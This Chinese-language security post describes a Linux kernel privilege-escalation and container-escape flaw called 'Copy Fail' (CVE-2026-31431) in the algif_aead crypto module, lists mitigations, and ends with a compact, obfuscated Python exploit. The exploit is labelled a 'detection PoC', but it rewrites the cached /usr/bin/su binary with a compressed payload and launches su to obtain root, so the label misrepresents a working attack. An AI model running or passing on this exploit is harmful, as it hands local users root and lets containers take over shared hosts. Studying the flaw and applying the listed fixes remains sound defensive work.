#  732 字节通杀 Linux内核 近 9 年！100% 稳定获取 root 权限。附Poc。  
原创 67626d
                    67626d  暗影安全   2026-04-30 03:22  
  
# 2026 年 4 月 30 日，Linux 内核曝出史诗级本地提权 + 容器逃逸漏洞 Copy Fail（CVE-2026-31431），仅凭一段 732 字节 Python 脚本，就能在 2017 年至今的几乎所有主流 Linux 发行版上100% 稳定获取 root 权限，还能实现跨容器逃逸，堪称近年少有的高危内核缺陷。  
  
  
## 一、漏洞核心：潜伏 9 年的直线逻辑错误  
  
Copy Fail 并非依赖竞态条件的传统漏洞，而是无竞争、无偏移、单次执行必成  
的直线逻辑缺陷，根源藏在内核加密子系统：  
- 2017 年，内核为 algif_aead 模块引入原地优化  
，让 AF_ALG 套接字处理 AEAD 解密时，将页缓存（page cache）页面直接放入可写分散 / 聚集列表。  
  
- 攻击者通过splice()零拷贝，把任意可读文件（如/usr/bin/su）的页缓存页面传入 AF_ALG 套接字。  
  
- 解密函数crypto_authenc_esn_decrypt()越界写入 4 字节序列码，不恢复原始数据  
，精准篡改页缓存内容，完成提权与逃逸。  
  
整个过程不碰磁盘、无文件事件、无脏页标记，重启或清空缓存即恢复，隐蔽性拉满  
。  
  
  
## 二、恐怖破坏力：通杀全场景，容器成重灾区  
### 1. 极致便携与成功率  
- 同一 Python 脚本（仅依赖标准库），无需编译、无需适配，Ubuntu、Amazon Linux、RHEL、SUSE 全通杀  
。  
  
- 成功率100%  
，单次执行直接拿到 root shell，远超传统 LPE 漏洞 30%-80% 的成功率。  
  
### 2. 致命容器逃逸能力  
  
页缓存是主机全局共享，普通容器 Pod 可直接篡改宿主机页缓存，突破容器边界接管整个节点  
，对 K8s、Docker 集群威胁致命。  
### 3. 高危覆盖场景  
- 多租户主机、共享跳板机  
  
- Kubernetes / 容器集群（节点逃逸 + 跨租户攻击）  
  
- 自托管 CI/CD（GitHub Actions、Jenkins 等）  
  
- 云 SaaS 代码沙箱（Notebook、Serverless）  
  
- 个人桌面风险较低，但仍建议修复。  
  
## 三、与经典漏洞对比：比 Dirty Cow 更致命  
<table><tbody><tr style="height: 40px;"><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">特性</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">传统 Linux LPE</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">Copy Fail</span></p></td></tr><tr style="height: 40px;"><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">依赖竞态</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">是</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">否</span></p></td></tr><tr style="height: 40px;"><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">需要内存偏移</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">是</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">否</span></p></td></tr><tr style="height: 40px;"><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">利用成功率</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">30%-80%</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">100% 单次必成</span></p></td></tr><tr style="height: 40px;"><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">影响周期</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">窄</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">2017-2026（近 9 年）</span></p></td></tr><tr style="height: 40px;"><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">容器逃逸</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">极少</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">完美支持</span></p></td></tr><tr style="height: 40px;"><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">隐蔽性</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">一般</span></p></td><td style="min-width: 200px;min-height: 40px;box-sizing: border-box;padding: 9px 8px;vertical-align: top;border: 1px solid rgb(222, 224, 227);"><p><span leaf="">极高（仅内存修改）</span></p></td></tr></tbody></table>  
  
## 四、紧急修复：3 步快速封堵，零业务影响  
### 1. 终极方案：升级内核（首选）  
  
更新至包含主线提交 a664bf3d603d  
的内核版本，回滚 2017 年原地优化，彻底阻断漏洞利用路径，主流发行版已推送补丁。  
### 2. 临时缓解：禁用 algif_aead 模块（补丁未到前）  
  
执行命令禁用模块，对绝大多数系统无副作用  
，不影响 dm-crypt、kTLS、IPsec、SSH 等常用服务：  
```

```  
```
# 临时禁用
modprobe -r algif_aead
# 永久禁用
echo "blacklist algif_aead" >> /etc/modprobe.d/disable-algif-aead.conf
```  
### 3. 容器加固：seccomp 策略拦截  
  
在容器、CI 环境中，通过 seccomp 直接阻断AF_ALG 套接字创建  
，双重防护容器逃逸风险。  
  
  
## 五、安全启示：小优化酿大灾，内核安全无小事  
  
Copy Fail 再次印证：内核一行代码的边界检查缺失，可能埋下近 10 年的定时炸弹  
。页缓存的共享设计在多租户、云原生时代已成双刃剑，微小缺陷会被无限放大。  
### 行动建议  
1. 立即核查服务器内核版本与 algif_aead 模块状态  
  
1. 优先为生产、多租户、K8s 集群打补丁  
  
1. 容器环境同步启用 seccomp 加固  
  
1. 关注发行版官方补丁推送，及时完成升级  
  
漏洞 PoC 已公开，黑产利用在即，越早修复越安全  
。  
  
检测Poc：  
```
#!/usr/bin/env python3
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c):
 a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
f=g.open("/usr/bin/su",0);i=0;e=zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))
while i<len(e):c(f,i,e[i:i+4]);i+=4
g.system("su")
```  
  
  
  
